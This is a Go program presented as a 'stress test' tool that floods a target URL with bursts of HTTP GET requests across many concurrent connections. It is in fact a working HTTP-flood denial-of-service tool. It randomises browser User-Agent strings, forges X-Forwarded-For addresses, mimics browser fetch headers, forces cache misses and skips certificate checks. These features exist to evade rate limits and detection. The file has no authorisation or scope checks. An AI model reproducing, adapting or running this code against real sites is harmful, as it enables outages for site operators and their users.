package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// Global state for DNS IPs (if you want to add custom DNS rotation later)
var (
	languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
	contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
)

// StressConfig holds command-line configuration
type StressConfig struct {
	Target     *url.URL
	Threads    int
	Duration   time.Duration
	CustomHost string
	Port       int
	Path       string
}

func init() {
	// Seed the random generator for unique requests
	rand.Seed(time.Now().UnixNano())
}

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: <URL> <THREADS> <DURATION_SEC> [CUSTOM_HOST]")
		os.Exit(1)
	}

	rawURL := os.Args[1]
	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads < 1 {
		log.Fatalf("invalid thread count %q: %v", os.Args[2], err)
	}
	durSec, err := strconv.Atoi(os.Args[3])
	if err != nil || durSec < 1 {
		log.Fatalf("invalid duration %q: %v", os.Args[3], err)
	}

	custom := ""
	if len(os.Args) > 4 {
		custom = os.Args[4]
	}

	parsed, err := url.Parse(rawURL)
	if err != nil {
		log.Fatalf("Invalid URL %q: %v", rawURL, err)
	}

	port := determinePort(parsed)
	path := parsed.RequestURI()
	if path == "" {
		path = "/"
	}

	cfg := StressConfig{
		Target:     parsed,
		Threads:    threads,
		Duration:   time.Duration(durSec) * time.Second,
		CustomHost: custom,
		Port:       port,
		Path:       path,
	}

	fmt.Printf("Starting stress test: %s via %s, threads=%d, duration=%v\n",
		rawURL, path, threads, cfg.Duration)
	runWorkers(cfg)
	fmt.Println("Stress test completed.")
}

// determinePort extracts port from URL or defaults to 80/443
func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if pi, err := strconv.Atoi(p); err == nil {
			return pi
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}

// runWorkers spawns goroutines to send request bursts until timeout
func runWorkers(cfg StressConfig) {
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), cfg.Duration)
	defer cancel()

	// Create a single shared TLS config to reuse across connections
	serverName := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		serverName = cfg.CustomHost
	}
	tlsCfg := &tls.Config{
		ServerName:         serverName,
		InsecureSkipVerify: true,
		// To enable TLS session reuse, uncomment the line below:
		// ClientSessionCache: tls.NewLRUClientSessionCache(128),
	}

	for i := 0; i < cfg.Threads; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			ticker := time.NewTicker(60 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-ctx.Done():
					return
				case <-ticker.C:
					sendBurst(ctx, cfg, tlsCfg)
				}
			}
		}(i)
	}
	wg.Wait()
}

// sendBurst opens a connection and sends back-to-back requests
func sendBurst(ctx context.Context, cfg StressConfig, tlsCfg *tls.Config) {
	address := fmt.Sprintf("%s:%d", cfg.Target.Hostname(), cfg.Port)
	conn, err := dialConn(ctx, address, tlsCfg)
	if err != nil {
		fmt.Printf("[dial error] %v\n", err)
		return
	}
	defer conn.Close()

	// send a burst of requests
	for i := 0; i < 180; i++ {
		if err := conn.SetWriteDeadline(time.Now().Add(2 * time.Second)); err != nil {
      return
    }
		req := buildRequest(cfg)
		if _, err := conn.Write(req); err != nil {
			fmt.Printf("[write error] %v\n", err)
			return
		}
		// Drain some of the response to avoid buildup
		tmp := make([]byte, 4096)
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		conn.Read(tmp) // ignore output
	}
}

// dialConn chooses TCP or TLS based on port and applies timeouts
func dialConn(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	if tlsCfg != nil && strings.HasSuffix(addr, ":443") {
		rawConn, err := dialer.DialContext(ctx, "tcp", addr)
		if err != nil {
			return nil, err
		}
		// wrap in TLS and handshake immediately
		tlsConn := tls.Client(rawConn, tlsCfg)
		if err := tlsConn.Handshake(); err != nil {
			rawConn.Close()
			return nil, err
		}
		return tlsConn, nil
	}
	return dialer.DialContext(ctx, "tcp", addr)
}

var bufPool = sync.Pool{
	New: func() any { return new(bytes.Buffer) },
}

// buildRequest constructs one GET request; pooled for efficiency
func buildRequest(cfg StressConfig) []byte {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()
	defer bufPool.Put(buf)

	hostHdr := cfg.Target.Hostname()
	if cfg.CustomHost != "" {
		hostHdr = cfg.CustomHost
	}

	// Request line + Host header (no explicit port)
	buf.WriteString("GET " + cfg.Path + " HTTP/1.1\r\n")
	buf.WriteString("Host: " + hostHdr + "\r\n")

	// Common headers
	writeCommonHeaders(buf)

	// Referer matches scheme
	buf.WriteString("Referer: " + cfg.Target.Scheme + "://" + hostHdr + "/\r\n")
	buf.WriteString("Connection: keep-alive\r\n\r\n")

	// Copy out to a fresh slice so the pool isn’t mutated downstream
	out := make([]byte, buf.Len())
	copy(out, buf.Bytes())
	return out
}

func writeCommonHeaders(buf *bytes.Buffer) {
	buf.WriteString("User-Agent: " + randomUserAgent() + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rand.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
	buf.WriteString("Sec-Fetch-Site: none\r\nSec-Fetch-Mode: navigate\r\n")
	buf.WriteString("Sec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\n")
	buf.WriteString("Upgrade-Insecure-Requests: 1\r\nCache-Control: no-cache\r\n")
	buf.WriteString("Content-Type: " + contentTypes[rand.Intn(len(contentTypes))] + "\r\n")
	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256))
}

func randomUserAgent() string {
	osList := []string{"Windows NT 10.0; Win64; x64", "Macintosh; Intel Mac OS X 10_15_7", "X11; Linux x86_64"}
	osID := osList[rand.Intn(len(osList))]

	switch rand.Intn(3) {
	case 0:
		v := fmt.Sprintf("%d.0.%d.0", rand.Intn(40)+80, rand.Intn(4000))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", osID, v)
	case 1:
		v := fmt.Sprintf("%d.0", rand.Intn(40)+70)
		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 Firefox/%s", osID, v, v)
	default:
		v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version/13.1 Safari/%s", osID, v, v)
	}
}
